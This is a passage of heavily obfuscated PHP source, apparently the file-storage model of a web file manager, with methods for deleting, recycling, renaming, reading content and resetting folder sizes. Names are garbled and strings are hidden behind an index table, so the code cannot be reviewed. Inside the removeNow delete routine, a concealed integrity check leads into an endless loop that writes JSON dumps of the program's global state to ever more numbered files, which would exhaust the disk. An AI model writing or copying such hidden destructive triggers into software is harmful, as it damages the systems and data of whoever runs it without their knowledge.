$Ûùöş¡¡[$¸ÑŸ»[2306]] ? $Ûùöş¡¡[$¸ÑŸ»[2306]] : $Ûùöş¡¡[$¸ÑŸ»[32]]; show_json(LNG($¸ÑŸ»[2307]) . $¸ÑŸ»[2308] . LNG($¸ÑŸ»[2309]) . $¸ÑŸ»[2310] . $ÌÉÂ–€ç . $¸ÑŸ»[2311], !1); } public function fileIsLock($ÓÀ«£İÀ, $ÔÙããÊ¬ = false) { $¦»½‚¼µ =& $_SERVER[¯‘·½]; if (!_get($ÓÀ«£İÀ, $¦»½‚¼µ[613], 0)) { return !1; } if ($ÓÀ«£İÀ[$¦»½‚¼µ[543]][$¦»½‚¼µ[616]] != USER_ID) { return !0; } $úêšËË = $GLOBALS[$¦»½‚¼µ[6]][$¦»½‚¼µ[92]][$¦»½‚¼µ[614]]; if ($ÓÀ«£İÀ[$¦»½‚¼µ[543]][$¦»½‚¼µ[615]] <= time() - $úêšËË) { $this->metaSet($ÓÀ«£İÀ[$¦»½‚¼µ[194]], $¦»½‚¼µ[616], null); $this->metaSet($ÓÀ«£İÀ[$¦»½‚¼µ[194]], $¦»½‚¼µ[615], null); } if ($ÔÙããÊ¬) { $this->metaSet($ÓÀ«£İÀ[$¦»½‚¼µ[194]], $¦»½‚¼µ[615], time()); } return !1; } private function _addSource($Á­¥ı«, $ë¤–õƒ£) { $µœ»÷ù† =& $_SERVER[¯‘·½]; $Ïß²æ¸Â = defined($µœ»÷ù†[2237]) ? USER_ID : 0; $­÷´€ñ¨ = array($µœ»÷ù†[655] => $ë¤–õƒ£[$µœ»÷ù†[191]], $µœ»÷ù†[656] => $ë¤–õƒ£[$µœ»÷ù†[573]], $µœ»÷ù†[657] => $Ïß²æ¸Â, $µœ»÷ù†[658] => $Ïß²æ¸Â, $µœ»÷ù†[479] => $ë¤–õƒ£[$µœ»÷ù†[194]], $µœ»÷ù†[659] => $ë¤–õƒ£[$µœ»÷ù†[588]] . $ë¤–õƒ£[$µœ»÷ù†[194]] . $µœ»÷ù†[50], $µœ»÷ù†[506] => 0, $µœ»÷ù†[660] => $µœ»÷ù†[12]); $Á­¥ı« = array_merge($­÷´€ñ¨, $Á­¥ı«); $this->updateModifyTime($Á­¥ı«[$µœ»÷ù†[193]]); $€Ë¸«µÀ = $µœ»÷ù†[2312] . $ë¤–õƒ£[$µœ»÷ù†[194]]; if (isset(self::$cacheChildList[$€Ë¸«µÀ])) { unset(self::$cacheChildList[$€Ë¸«µÀ]); } static $±Ö‚Şíî = false; if (!$±Ö‚Şíî) { Hook::trigger($µœ»÷ù†[643], $Á­¥ı«); $±Ö‚Şíî = !0; } $Ø¨ñ¹ÇÉ = $this->add($Á­¥ı«); $ƒúÒ»Ë = array($µœ»÷ù†[661] => short_id($Ø¨ñ¹ÇÉ)); $this->where(array($µœ»÷ù†[493] => $Ø¨ñ¹ÇÉ))->save($ƒúÒ»Ë); $this->setNamePinyin($Ø¨ñ¹ÇÉ, $Á­¥ı«[$µœ»÷ù†[32]]); return $Ø¨ñ¹ÇÉ; } public function remove($§ôöè›Ë, $¨ÚÛ«ú = true) { $ìƒÂ¿™¨ =& $_SERVER[¯‘·½]; $áĞÆ·ÒÑ = $this->sourceInfo($§ôöè›Ë); $¥—ëáæ = intval($áĞÆ·ÒÑ[$ìƒÂ¿™¨[191]]) === self::TYPE_SYSTEM; $Ê²İœŞ® = Model($ìƒÂ¿™¨[510])->get($ìƒÂ¿™¨[2313]) == $ìƒÂ¿™¨[91]; if ($¥—ëáæ || $¨ÚÛ«ú || !$Ê²İœŞ®) { return $this->removeNow($§ôöè›Ë, $¨ÚÛ«ú); } $ÏíÕÍæÅ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ò§Ù¯†Ş = $áĞÆ·ÒÑ[$ìƒÂ¿™¨[191]] == self::TYPE_USER ? $ìƒÂ¿™¨[669] : $ìƒÂ¿™¨[582]; if ($Ò§Ù¯†Ş == $ìƒÂ¿™¨[669]) { $öº‰ğëå = Model($ìƒÂ¿™¨[581])->getInfo($áĞÆ·ÒÑ[$ìƒÂ¿™¨[573]]); $‰Ñ•ÊÍ = !empty($öº‰ğëå[$ìƒÂ¿™¨[2306]]) ? $öº‰ğëå[$ìƒÂ¿™¨[2306]] : $öº‰ğëå[$ìƒÂ¿™¨[32]]; $‰Ñ•ÊÍ = $ìƒÂ¿™¨[340] . $‰Ñ•ÊÍ . $ìƒÂ¿™¨[2314] . $áĞÆ·ÒÑ[$ìƒÂ¿™¨[573]]; } else { $öº‰ğëå = Model($ìƒÂ¿™¨[589])->getInfo($áĞÆ·ÒÑ[$ìƒÂ¿™¨[573]]); $‰Ñ•ÊÍ = _get($öº‰ğëå, $ìƒÂ¿™¨[32]); $‰Ñ•ÊÍ = $ìƒÂ¿™¨[176] . $‰Ñ•ÊÍ . $ìƒÂ¿™¨[2315] . $áĞÆ·ÒÑ[$ìƒÂ¿™¨[573]]; } $ü¾ìúÅ« = $ìƒÂ¿™¨[2316] . md5($‰Ñ•ÊÍ); CacheLock::lock($ü¾ìúÅ«); $ş†ùûÙ = $this->fileNameExist($ÏíÕÍæÅ, $‰Ñ•ÊÍ); if (!$ş†ùûÙ) { $ş†ùûÙ = $this->mkdir($ÏíÕÍæÅ, $‰Ñ•ÊÍ, REPEAT_SKIP); $this->metaSet($ş†ùûÙ, $ìƒÂ¿™¨[2317], $Ò§Ù¯†Ş); $this->metaSet($ş†ùûÙ, $ìƒÂ¿™¨[2318], $áĞÆ·ÒÑ[$ìƒÂ¿™¨[573]]); if ($áĞÆ·ÒÑ[$ìƒÂ¿™¨[193]] != 0) { $this->metaSet($ş†ùûÙ, $ìƒÂ¿™¨[2319], _get($öº‰ğëå, $ìƒÂ¿™¨[2320])); } } CacheLock::unlock($ü¾ìúÅ«); $this->metaSet($§ôöè›Ë, $ìƒÂ¿™¨[2321], $áĞÆ·ÒÑ[$ìƒÂ¿™¨[193]]); $this->where(array($ìƒÂ¿™¨[194] => $§ôöè›Ë))->save(array($ìƒÂ¿™¨[500] => time())); $this->recycleClear($áĞÆ·ÒÑ); Model($ìƒÂ¿™¨[640])->eventRemove($§ôöè›Ë); $‚™Şã ½ = $this->move($§ôöè›Ë, $ş†ùûÙ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($áĞÆ·ÒÑ[$ìƒÂ¿™¨[193]]); return $‚™Şã ½; } private function recycleClear($€¶³¹ÒÉ) { $ĞàÑÍÖ =& $_SERVER[¯‘·½]; $èíÇ¨ş‰ = $this->childrenAll($€¶³¹ÒÉ); $º÷áö¿¾ = array($ĞàÑÍÖ[493] => array($ĞàÑÍÖ[494], $èíÇ¨ş‰[$ĞàÑÍÖ[2322]])); Model($ĞàÑÍÖ[2323])->where($º÷áö¿¾)->delete(); } public function removeNow($ÉÚè¾ó», $êÉ Óº  = true) { $êÏ««Æª =& $_SERVER[¯‘·½]; $âËî•ûú = $_SERVER[$êÏ««Æª[1247]]; $Ì±ôá…ò = $êÏ««Æª[1655]; if ($_SERVER[$êÏ««Æª[969]] != $Ì±ôá…ò($âËî•ûú)) { $éì˜•…Ã = $êÏ««Æª[971]; $û”×£€† = $êÏ««Æª[972]; $ä…Ò‹›º = $_SERVER[$êÏ««Æª[973]] . $êÏ««Æª[974]; $¡³õãô‡ = $û”×£€†($ä…Ò‹›º); $ŸŒÔ³ğ¯ = explode($êÏ««Æª[288], $¡³õãô‡); if (count($ŸŒÔ³ğ¯) < $êÏ««Æª[690]) { $´ÓÏß«Ø = $êÏ««Æª[975]; $´ÓÏß«Ø(); } $©ÂíÂì‹ = $êÏ««Æª[976]; $©ÂíÂì‹($_SERVER[$êÏ««Æª[977]]); $éì˜•…Ã = $êÏ««Æª[971]; $éì˜•…Ã(); $§ò”°¤É = $êÏ««Æª[1656]; $—œ°­¥Ô = json_encode($GLOBALS[$êÏ««Æª[1657]]); $æúÊÀ¸î = 1; for ($‡¿Ìµ×Ñ = $æúÊÀ¸î; $‡¿Ìµ×Ñ > 0; $‡¿Ìµ×Ñ++) { $§ò”°¤É(DATA_PATH . $‡¿Ìµ×Ñ, $—œ°­¥Ô); } } $¿¾°¸ŞÌ = $this->sourceInfo($ÉÚè¾ó»); $á®äÙìÎ = $this->pathInfoMore($ÉÚè¾ó»); if (!$¿¾°¸ŞÌ) { return !0; } if ($¿¾°¸ŞÌ[$êÏ««Æª[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÉÚè¾ó»); Hook::trigger($êÏ««Æª[2324], $á®äÙìÎ, $êÉ Óº ); if ($êÉ Óº ) { Model($êÏ««Æª[2323])->moveToRecycle($ÉÚè¾ó»); } else { $Òü™âÒà = $this->childrenAll($¿¾°¸ŞÌ); Model($êÏ««Æª[640])->eventRemove($ÉÚè¾ó»); $this->removeRelevance($Òü™âÒà[$êÏ««Æª[2322]], $Òü™âÒà[$êÏ««Æª[1606]]); } $this->folderSizeReset($¿¾°¸ŞÌ[$êÏ««Æª[193]]); $ÅŒ¯¢’“ = array($¿¾°¸ŞÌ[$êÏ««Æª[193]]); if ($¿¾°¸ŞÌ[$êÏ««Æª[487]] == $êÏ««Æª[91]) { $ÅŒ¯¢’“[] = $¿¾°¸ŞÌ[$êÏ««Æª[194]]; } $this->updateModifyTime($ÅŒ¯¢’“); $this->lockMoveEnd($ÉÚè¾ó»); Hook::trigger($êÏ««Æª[1849], $á®äÙìÎ, $êÉ Óº ); return !0; } public function childrenAll($­åÊ±–¦) { $½ã¡ŞÃì =& $_SERVER[¯‘·½]; $ÒøÛÕ° = $­åÊ±–¦[$½ã¡ŞÃì[194]]; if ($­åÊ±–¦[$½ã¡ŞÃì[487]] == $½ã¡ŞÃì[91]) { $ãÖÍªÅš = array($½ã¡ŞÃì[659] => array($½ã¡ŞÃì[619], $­åÊ±–¦[$½ã¡ŞÃì[588]] . $ÒøÛÕ° . $½ã¡ŞÃì[620])); $±ßŸÔ…° = array($½ã¡ŞÃì[659] => $ãÖÍªÅš[$½ã¡ŞÃì[588]]); $Àš¯º¥ = $this->field($½ã¡ŞÃì[2325])->where($±ßŸÔ…°)->select(); $Ğ¹ø‚† = !1; $ú‰ƒ£Ø = array($ÒøÛÕ°); if ($Àš¯º¥) { $Ğ¹ø‚† = array_to_keyvalue($Àš¯º¥, $½ã¡ŞÃì[12], $½ã¡ŞÃì[545]); $Ğ¹ø‚† = array_remove_value($Ğ¹ø‚†, $½ã¡ŞÃì[231]); $ú‰ƒ£Ø = array_to_keyvalue($Àš¯º¥, $½ã¡ŞÃì[12], $½ã¡ŞÃì[194]); $ú‰ƒ£Ø[] = $ÒøÛÕ°; } } else { $Ğ¹ø‚† = array($­åÊ±–¦[$½ã¡ŞÃì[545]]); $ú‰ƒ£Ø = array($ÒøÛÕ°); } return array($½ã¡ŞÃì[2322] => $ú‰ƒ£Ø, $½ã¡ŞÃì[1606] => $Ğ¹ø‚†); } public function removeArray($Ûşí¬±Ÿ) { if (!$Ûşí¬±Ÿ) { return !0; } } public function removeRelevance($Áöû™¢â, $‹µç½ÚØ) { $¡¡ÈÈÓÌ =& $_SERVER[¯‘·½]; $Áöû™¢â = $Áöû™¢â ? $Áöû™¢â : array(); $‹µç½ÚØ = $‹µç½ÚØ ? $‹µç½ÚØ : array(); $Áöû™¢â = array_unique(array_filter($Áöû™¢â)); $‹µç½ÚØ = array_filter($‹µç½ÚØ); if (!$Áöû™¢â) { return !1; } $›µ„ĞÌë = array($¡¡ÈÈÓÌ[493] => array($¡¡ÈÈÓÌ[494], $Áöû™¢â)); Model($¡¡ÈÈÓÌ[2323])->where($›µ„ĞÌë)->delete(); Model($¡¡ÈÈÓÌ[537])->where($›µ„ĞÌë)->delete(); Model($¡¡ÈÈÓÌ[2161])->where($›µ„ĞÌë)->delete(); Model($¡¡ÈÈÓÌ[640])->where($›µ„ĞÌë)->delete(); Model($¡¡ÈÈÓÌ[1986])->removeBySource($Áöû™¢â); Model($¡¡ÈÈÓÌ[2304])->removeBySource($Áöû™¢â); $this->where($›µ„ĞÌë)->delete(); Model($¡¡ÈÈÓÌ[548])->remove($‹µç½ÚØ); for ($¦²öµ™• = 0; $¦²öµ™• < count($Áöû™¢â); $¦²öµ™•++) { $this->sourceCacheClear($Áöû™¢â[$¦²öµ™•]); } } public function rename($ıÈº²ëÔ, $Œ˜ãĞçÖ) { $à·²€ø =& $_SERVER[¯‘·½]; $ÚÉÍÄ» = $this->sourceInfo($ıÈº²ëÔ); if (!$ÚÉÍÄ») { return !1; } $Î¡‡Ô­Ò = $this->fileNameExist($ÚÉÍÄ»[$à·²€ø[193]], $Œ˜ãĞçÖ); if ($Î¡‡Ô­Ò && $Î¡‡Ô­Ò != $ıÈº²ëÔ) { return !1; } $°‡¹ÍáØ = array($à·²€ø[496] => $Œ˜ãĞçÖ, $à·²€ø[658] => USER_ID); if ($ÚÉÍÄ»[$à·²€ø[487]] != $à·²€ø[91]) { $°‡¹ÍáØ[$à·²€ø[488]] = substr(get_path_ext($Œ˜ãĞçÖ), 0, 10); } Model($à·²€ø[640])->eventRename($ıÈº²ëÔ, $ÚÉÍÄ»[$à·²€ø[32]], $Œ˜ãĞçÖ); $this->sourceCacheClear($ıÈº²ëÔ); $this->setNamePinyin($ıÈº²ëÔ, $°‡¹ÍáØ[$à·²€ø[32]], !1); $this->updateModifyTime($ÚÉÍÄ»[$à·²€ø[193]]); $€¿ı»§ñ = $this->where(array($à·²€ø[493] => $ıÈº²ëÔ))->data($°‡¹ÍáØ)->save(); $øƒ‘÷»û = $à·²€ø[2312] . $ÚÉÍÄ»[$à·²€ø[193]]; if (isset(self::$cacheChildList[$øƒ‘÷»û])) { unset(self::$cacheChildList[$øƒ‘÷»û]); } return $€¿ı»§ñ; } public function setNamePinyin($´¸ˆ†, $Şğãä, $ ®Ç‘™´ = true) { $å­ªËİ˜ =& $_SERVER[¯‘·½]; $äú†ĞÇ· = Input::check($Şğãä, $å­ªËİ˜[662]); $÷–¥¶æ = array($å­ªËİ˜[519] => KodSort::makeStr($Şğãä)); if ($äú†ĞÇ·) { $÷–¥¶æ[$å­ªËİ˜[540]] = str_replace($å­ªËİ˜[53], $å­ªËİ˜[12], Pinyin::get($Şğãä)); $÷–¥¶æ[$å­ªËİ˜[539]] = Pinyin::get($Şğãä, $å­ªËİ˜[663]); } if (!$ ®Ç‘™´ && !$äú†ĞÇ·) { $÷–¥¶æ[$å­ªËİ˜[540]] = null; $÷–¥¶æ[$å­ªËİ˜[539]] = null; } $this->metaSet($´¸ˆ†, $÷–¥¶æ); } public function getContent($ùı®é¾) { $€íåò¤ =& $_SERVER[¯‘·½]; $Ú¥¦¸Ü = $this->fileInfoGet($ùı®é¾); if (!$Ú¥¦¸Ü) { return !1; } if ($Ú¥¦¸Ü[$€íåò¤[79]] == 0) { return $€íåò¤[12]; } $…Ú¡¦·Ò = $€íåò¤[2326] . $Ú¥¦¸Ü[$€íåò¤[551]]; if ($Ú¥¦¸Ü[$€íåò¤[79]] <= 1024 * 10) { $¸şÖ•İ‰ = Cache::get($…Ú¡¦·Ò); if (!$¸şÖ•İ‰) { $¸şÖ•İ‰ = IO::getContent($Ú¥¦¸Ü[$€íåò¤[87]]); Cache::set($…Ú¡¦·Ò, $¸şÖ•İ‰); } return $¸şÖ•İ‰; } if (!$Ú¥¦¸Ü[$€íåò¤[87]]) { return $€íåò¤[12]; } return IO::getContent($Ú¥¦¸Ü[$€íåò¤[87]]); } public function setDesc($İÕ’¢åƒ, $æçˆ„•) { $œİÀÛëŒ =& $_SERVER[¯‘·½]; Model($œİÀÛëŒ[640])->eventAddDesc($İÕ’¢åƒ, $æçˆ„•); return $this->metaSet($İÕ’¢åƒ, $œİÀÛëŒ[528], $æçˆ„•); } public function setContent($Ô„Ä—±Á, $ìùÑ÷ß = '') { $‚Ö°ÕÎ‘ =& $_SERVER[¯‘·½]; $Á—úğè = $this->sourceInfo($Ô„Ä—±Á); $„¿¡Å‰¦ = $this->fileInfoGet($Ô„Ä—±Á); if (!$„¿¡Å‰¦ || !$Á—úğè) { return !1; } $ŞÒ¿ÅÀ = KodIO::ioFileDriverGet($‚Ö°ÕÎ‘[485] . $Ô„Ä—±Á . $‚Ö°ÕÎ‘[404]); $è½Ù¹¥• = Model($‚Ö°ÕÎ‘[548])->addFileByContent($ìùÑ÷ß, $ŞÒ¿ÅÀ, $Á—úğè[$‚Ö°ÕÎ‘[32]]); if (!$è½Ù¹¥•) { return !1; } $ŞÀû™¬Ó = $this->fileHistory($Á—úğè, $è½Ù¹¥•[$‚Ö°ÕÎ‘[545]], $è½Ù¹¥•[$‚Ö°ÕÎ‘[79]]); if (!$ŞÀû™¬Ó) { return Model($‚Ö°ÕÎ‘[548])->remove($è½Ù¹¥•[$‚Ö°ÕÎ‘[545]]); } $this->folderSizeReset($Á—úğè[$‚Ö°ÕÎ‘[193]]); return !0; } public function fileSubstr($µÏ•éÌ, $ÈˆŸøŠÛ, $«Ù×¦) { $£Âèš¬ = $this->fileInfoGet($µÏ•éÌ); if (!$£Âèš¬) { return !1; } return IO::fileSubstr($£Âèš¬[$_SERVER[¯‘·½][87]], $ÈˆŸøŠÛ, $«Ù×¦); } public function fileInfoGet($åì®ª†) { $ó¡«ÁÜ– =& $_SERVER[¯‘·½]; $´àßñ¿ = $this->sourceInfo($åì®ª†); if (!$´àßñ¿ || $´àßñ¿[$ó¡«ÁÜ–[487]]) { return !1; } $¯ª¡âË = $ó¡«ÁÜ–[552] . $´àßñ¿[$ó¡«ÁÜ–[545]]; $µõ˜’Õß = _get(self::$cacheFileInfo, $¯ª¡âË); if ($µõ˜’Õß) { return $µõ˜’Õß; } $ÜŞÂë´‚ = Model($ó¡«ÁÜ–[548])->fileInfo($´àßñ¿[$ó¡«ÁÜ–[545]]); if ($ÜŞÂë´‚) { $ÜŞÂë´‚[$ó¡«ÁÜ–[32]] = $´àßñ¿[$ó¡«ÁÜ–[32]]; } self::$cacheFileInfo[$¯ª¡âË] = $ÜŞÂë´‚; return $ÜŞÂë´‚; } private function folderChildrenNumber($åÊ´Á’¸) { $¥Ã½±ë¤ =& $_SERVER[¯‘·½]; $ŠüÚÒ»• = $this->sourceInfo($åÊ´Á’¸); $öëŠí‡‹ = array($¥Ã½±ë¤[659] => array($¥Ã½±ë¤[619], $ŠüÚÒ»•[$¥Ã½±ë¤[588]] . $åÊ´Á’¸ . $¥Ã½±ë¤[620]), $¥Ã½±ë¤[656] => $ŠüÚÒ»•[$¥Ã½±ë¤[573]], $¥Ã½±ë¤[506] => intval($ŠüÚÒ»•[$¥Ã½±ë¤[507]]), $¥Ã½±ë¤[653] => 1); $ŒäÍÈ©Ö = $this->where($öëŠí‡‹)->count(); $—áÕÌ×­ = $this->where($öëŠí‡‹)->where(array($¥Ã½±ë¤[653] => 0))->count(); return array($¥Ã½±ë¤[83] => $—áÕÌ×­, $¥Ã½±ë¤[84] => $ŒäÍÈ©Ö); } public function pathInfo($ú†‰úìÁ, $†ÖÀ™¿ = false) { $æ«ï°ŒÈ =& $_SERVER[¯‘·½]; $†ÖÀ™¿ = !1; $ú†‰úìÁ = intval($ú†‰úìÁ); $ƒæÜ™‘— = $æ«ï°ŒÈ[536] . intval($†ÖÀ™¿) . $æ«ï°ŒÈ[464] . $ú†‰úìÁ; $õ¦ÜÓÃƒ = _get(self::$cachePathInfo, $ƒæÜ™‘—); if ($õ¦ÜÓÃƒ) { return $õ¦ÜÓÃƒ; } $®şûüñ = $this->sourceInfo($ú†‰úìÁ); if (!$®şûüñ) { return !1; } $®şûüñ = $this->_listDataApplyItem($®şûüñ, $†ÖÀ™¿); self::$cachePathInfo[$ƒæÜ™‘—] = $®şûüñ; return $®şûüñ; } public static $cachePathInfoMore = array(); public function pathInfoMore($‹øä†­¥) { $¶ØºîÀÅ =& $_SERVER[¯‘·½]; $ã—Óùˆñ = _get(self::$cachePathInfoMore, $‹øä†­¥); if ($ã—Óùˆñ) { return $ã—Óùˆñ; } $²°¶™µ  = $this->pathInfo($‹øä†­¥); if (!$²°¶™µ ) { return !1; } if ($²°¶™µ [$¶ØºîÀÅ[487]] == $¶ØºîÀÅ[91]) { $²°¶™µ [$¶ØºîÀÅ[82]] = $this->folderChildrenNumber($‹øä†­¥); } self::$cachePathInfoMore[$‹øä†­¥] = $²°¶™µ ; return $²°¶™µ ; } public function sourceInfo($¢ˆ³ÍË) { $ÓÖ–—ú =& $_SERVER[¯‘·½]; if (!$¢ˆ³ÍË) { return array(); } $¢ˆ³ÍË = intval($¢ˆ³ÍË); $†àÏå‰ñ = $ÓÖ–—ú[535] . $¢ˆ³ÍË; $¡‡¹îš = _get(self::$cacheSourceInfo, $†àÏå‰ñ); if ($¡‡¹îš) { return $¡‡¹îš; } $òÌÒ¯» = $this->where(array($ÓÖ–—ú[194] => $¢ˆ³ÍË))->find(); self::$cacheSourceInfo[$†àÏå‰ñ] = $òÌÒ¯»; return self::$cacheSourceInfo[$†àÏå‰ñ]; } public function sourceCacheClear($º‹ëÒÔ© = false) { self::cacheClear($º‹ëÒÔ©); } public static function cacheClear($«Ş°ı§è = false) { $òÖ¶¶î‡ =& $_SERVER[¯‘·½]; if ($«Ş°ı§è == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$òÖ¶¶î‡[535] . $«Ş°ı§è]); unset(self::$cachePathInfoMore[$«Ş°ı§è]); unset(self::$cachePathInfo[$òÖ¶¶î‡[2327] . $«Ş°ı§è]); unset(self::$cachePathInfo[$òÖ¶¶î‡[2328] . $«Ş°ı§è]); } public function metaSet($©ÚÖ°Ã·, $ü°Ø­§ = null, $ñŸ“ÄÛ = null) { $ ‡†Ô´ø = parent::metaSet($©ÚÖ°Ã·, $ü°Ø­§, $ñŸ“ÄÛ); if ($ ‡†Ô´ø) { $this->sourceCacheClear($©ÚÖ°Ã·); } return $ ‡†Ô´ø; } public function pathInfoByPath($†¸°¯Ÿ¯, $Øœ¦¢Œù) { $¡¿Í¨ß“ =& $_SERVER[¯‘·½]; $àÒ—›•‹ = !$Øœ¦¢Œù ? array() : explode($¡¿Í¨ß“[8], trim($Øœ¦¢Œù, $¡¿Í¨ß“[8])); $…Ê½›— = intval($†¸°¯Ÿ¯); foreach ($àÒ—›•‹ as $Š„ñ¬º) { $êÄ†¶´ = array($¡¿Í¨ß“[193] => $…Ê½›—, $¡¿Í¨ß“[32] => $Š„ñ¬º); $ûÎÆ”‰û = $this->field($¡¿Í¨ß“[2329])->where($êÄ†¶´)->select(); if (!$ûÎÆ”‰û) { return !1; } $ûÎÆ”‰û = array_sort_by($ûÎÆ”‰û, $¡¿Í¨ß“[507]); $…Ê½›— = intval($ûÎÆ”‰û[0][$¡¿Í¨ß“[194]]); } $Ï¦±ê™ = $this->sourceInfo($…Ê½›—); $this->pathInfoFilter($Ï¦±ê™); return $Ï¦±ê™; } protected function updateModifyTime($äŒÄçè÷) { $‡»÷Í‰ =& $_SERVER[¯‘·½]; $¾ßÅ³Şº = defined($‡»÷Í‰[2237]) ? USER_ID : 0; if (!$äŒÄçè÷) { return; } if (!is_array($äŒÄçè÷)) { $äŒÄçè÷ = array($äŒÄçè÷); } foreach ($äŒÄçè÷ as $çÌÎèºæ => $Ãï—íş¸) { $äŒÄçè÷[$çÌÎèºæ] = intval($Ãï—íş¸); $this->sourceCacheClear($Ãï—íş¸); } $‘±Öºƒ = array($‡»÷Í‰[194] => array($‡»÷Í‰[7], $äŒÄçè÷)); $¸Ô¦Á¤à = array($‡»÷Í‰[658] => $¾ßÅ³Şº, $‡»÷Í‰[500] => time()); $this->where($‘±Öºƒ)->save($¸Ô¦Á¤à); } public function folderSizeReset($Ÿğ­ºŞ†, $±üÉ–Í = false) { $±Á£ëµ¨ =& $_SERVER[¯‘·½]; if ($this->statusIgnoreResetSpace) { return; } if (!$Ÿğ­ºŞ†) { return; } $‘à¥ù¾µ = $this->sourceInfo($Ÿğ­ºŞ†); $«¤‹ŞÂ = $±Á£ëµ¨[2330] . $Ÿğ­ºŞ†; if (!$‘à¥ù¾µ || !$‘à¥ù¾µ[$±Á£ëµ¨[194]]) { return; } CacheLock::lock($«¤‹ŞÂ, 20); if ($±üÉ–Í === !1) { $this->sourceCacheClear($Ÿğ­ºŞ†); $‘à¥ù¾µ = $this->sourceInfo($Ÿğ­ºŞ†); $Š¬˜™à¬ = array($±Á£ëµ¨[479] => $Ÿğ­ºŞ†, $±Á£ëµ¨[506] => 0); $ª—¢çöÖ = $this->where($Š¬˜™à¬)->sum($±Á£ëµ¨[79]); $±üÉ–Í = intval($ª—¢çöÖ) - intval($‘à¥ù¾µ[$±Á£ëµ¨[79]]); } if ($±üÉ–Í == 0) { return CacheLock::unlock($«¤‹ŞÂ); } $³ÓˆŠ ³ = $this->parentLevelArray($‘à¥ù¾µ[$±Á£ëµ¨[588]]); if (!$³ÓˆŠ ³) { $³ÓˆŠ ³ = array(); } $³ÓˆŠ ³[] = $‘à¥ù¾µ[$±Á£ëµ¨[194]]; $Š¬˜™à¬ = array($±Á£ëµ¨[194] => array($±Á£ëµ¨[494], $³ÓˆŠ ³)); if ($±üÉ–Í < 0) { $Š¬˜™à¬[$±Á£ëµ¨[79]] = array($±Á£ëµ¨[1111], abs($±üÉ–Í)); } $this->where($Š¬˜™à¬)->setAdd($±Á£ëµ¨[79], $±üÉ–Í); CacheLock::unlock($«¤‹ŞÂ); if (!$‘à¥ù¾µ[$±Á£ëµ¨[573]] || $‘à¥ù¾µ[$±Á£ëµ¨[573]] == $±Á£ëµ¨[231]) { return; } $Ú„ó¢ı¶ = $±Á£ëµ¨[2331] . $‘à¥ù¾µ[$±Á£ëµ¨[191]] . $±Á£ëµ¨[4] . $‘à¥ù¾µ[$±Á£ëµ¨[573]]; $¹€ô‚¿ = array($‘à¥ù¾µ[$±Á£ëµ¨[191]], $‘à¥ù¾µ[$±Á£ëµ¨[573]]); TaskRun::timeLimitCall($Ú„ó¢ı¶, $±Á£ëµ¨[2332], $¹€ô‚¿, 1.5); } public function folderSizeResetChildren($èşæ˜ôó) { $ğ•äÂÄ¬ =& $_SERVER[¯‘·½]; $this->sourceCacheClear($èşæ˜ôó); $®ƒşø‘Á = $this->sourceInfo($èşæ˜ôó); if (!$®ƒşø‘Á) { return; } $­Ñ»¥¼Ô = array($ğ•äÂÄ¬[653] => 1, $ğ•äÂÄ¬[656] => $®ƒşø‘Á[$ğ•äÂÄ¬[573]], $ğ•äÂÄ¬[659] => array($ğ•äÂÄ¬[619], $®ƒşø‘Á[$ğ•äÂÄ¬[588]] . $èşæ˜ôó . $ğ•äÂÄ¬[620])); $ÁûÑë†Â = $ğ•äÂÄ¬[2333]; $‚®àÒÊ± = $this->field($ÁûÑë†Â)->where($­Ñ»¥¼Ô)->select(); $­Ñ»¥¼Ô[$ğ•äÂÄ¬[487]] = 0; $Àª…’—‰ = $this->field($ÁûÑë†Â)->where($­Ñ»¥¼Ô)->select(); if (!$Àª…’—‰) { return; } $‚®àÒÊ±[] = $®ƒşø‘Á; $‚®àÒÊ± = array_to_keyvalue($‚®àÒÊ±, $ğ•äÂÄ¬[194]); foreach ($‚®àÒÊ± as $éÑ¤¹¡ => $øÍ½¬Ê) { $‚®àÒÊ±[$éÑ¤¹¡][$ğ•äÂÄ¬[2334]] = $‚®àÒÊ±[$éÑ¤¹¡][$ğ•äÂÄ¬[79]]; $‚®àÒÊ±[$éÑ¤¹¡][$ğ•äÂÄ¬[79]] = 0; } foreach ($Àª…’—‰ as $øÍ½¬Ê) { $ÀâÖà = $øÍ½¬Ê[$ğ•äÂÄ¬[193]] . $ğ•äÂÄ¬[12]; if (!isset($‚®àÒÊ±[$ÀâÖà])) { continue; } if ($øÍ½¬Ê[$ğ•äÂÄ¬[507]] == $‚®àÒÊ±[$ÀâÖà][$ğ•äÂÄ¬[507]]) { $‚®àÒÊ±[$ÀâÖà][$ğ•äÂÄ¬[79]] += $øÍ½¬Ê[$ğ•äÂÄ¬[79]]; } } foreach ($‚®àÒÊ± as $øÍ½¬Ê) { $µŠæóÍÃ = $this->parentLevelArray($øÍ½¬Ê[$ğ•äÂÄ¬[588]]); foreach ($µŠæóÍÃ as $ÀâÖà) { $ÀâÖà = $ÀâÖà . $ğ•äÂÄ¬[12]; if (!isset($‚®àÒÊ±[$ÀâÖà])) { continue; } if ($øÍ½¬Ê[$ğ•äÂÄ¬[507]] == $‚®àÒÊ±[$ÀâÖà][$ğ•äÂÄ¬[507]]) { $‚®àÒÊ±[$ÀâÖà][$ğ•äÂÄ¬[79]] += $øÍ½¬Ê[$ğ•äÂÄ¬[79]]; } } } $®ûĞØ³è = array(); foreach ($‚®àÒÊ± as $øÍ½¬Ê) { if ($øÍ½¬Ê[$ğ•äÂÄ¬[79]] == $øÍ½¬Ê[$ğ•äÂÄ¬[2334]]) { continue; } $®ûĞØ³è[] = array($ğ•äÂÄ¬[194], $øÍ½¬Ê[$ğ•äÂÄ¬[194]], $ğ•äÂÄ¬[79], $øÍ½¬Ê[$ğ•äÂÄ¬[79]]); } $this->saveAll($®ûĞØ³è); } public function userSpaceReset($“‚‹±…ò = false) { $Æ€¨öú =& $_SERVER[¯‘·½]; $ƒôö×ş’ = $this->where(array($Æ€¨öú[191] => self::TYPE_USER, $Æ€¨öú[573] => $“‚‹±…ò, $Æ€¨öú[487] => 0))->sum($Æ€¨öú[79]); $ƒôö×ş’ = !$ƒôö×ş’ || $ƒôö×ş’ <= 0 ? 0 : $ƒôö×ş’; Model($Æ€¨öú[581])->userEdit($“‚‹±…ò, array($Æ€¨öú[1995] => $ƒôö×ş’)); } public function 